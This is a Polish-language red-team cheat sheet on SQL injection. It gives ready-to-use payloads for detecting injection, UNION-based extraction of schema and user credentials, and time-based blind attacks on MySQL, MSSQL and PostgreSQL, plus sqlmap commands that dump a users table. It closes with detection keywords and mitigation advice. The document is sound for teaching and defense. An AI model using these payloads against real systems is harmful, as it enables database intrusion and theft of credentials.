---
title: "SQL Injection"
category: "red-team"
tags: ["web", "injection", "owasp"]
platform: "web"
mitre: ["T1190"]
difficulty: "intermediate"
updated: "2026-07-11"
author: "core"
---

# SQL Injection

## TL;DR
Niezaufany input trafia do zapytania SQL. Typy: in-band (union/error), blind (boolean/time), out-of-band. `sqlmap` do automatyzacji, ale rozumiej ręcznie.

## Wykrywanie podatności
```sql
'                       -- błąd składni?
' OR '1'='1             -- boolean
1' ORDER BY 5-- -        -- liczba kolumn
1' UNION SELECT NULL,NULL-- -
```

## Eksploatacja (union)
```sql
-- wersja i bazy
' UNION SELECT NULL,@@version-- -
' UNION SELECT schema_name,NULL FROM information_schema.schemata-- -
-- kolumny tabeli
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
-- dane
' UNION SELECT username,password FROM users-- -
```

## Blind (time-based)
```sql
' OR IF(1=1,SLEEP(5),0)-- -                       # MySQL
'; IF (1=1) WAITFOR DELAY '0:0:5'--               # MSSQL
' || pg_sleep(5)--                                 # PostgreSQL
```

## Automatyzacja
```bash
sqlmap -u "https://site/item?id=1" --batch --dbs
sqlmap -r request.txt --dump -T users --threads 4
```

## Wykrywanie (Blue Team)
- WAF/logi: `UNION SELECT`, `information_schema`, `SLEEP(`, `WAITFOR`.
- Anomalie: nagły wzrost błędów DB, długie czasy odpowiedzi (time-based).

## Mitygacja / Hardening
- **Parametryzowane zapytania / prepared statements** (podstawa).
- ORM z bindowaniem, walidacja/allow-list inputu, least-privilege konto DB.
- WAF jako warstwa dodatkowa, nie zamiast.

## Źródła
- [PortSwigger – SQLi](https://portswigger.net/web-security/sql-injection) · [PayloadsAllTheThings SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
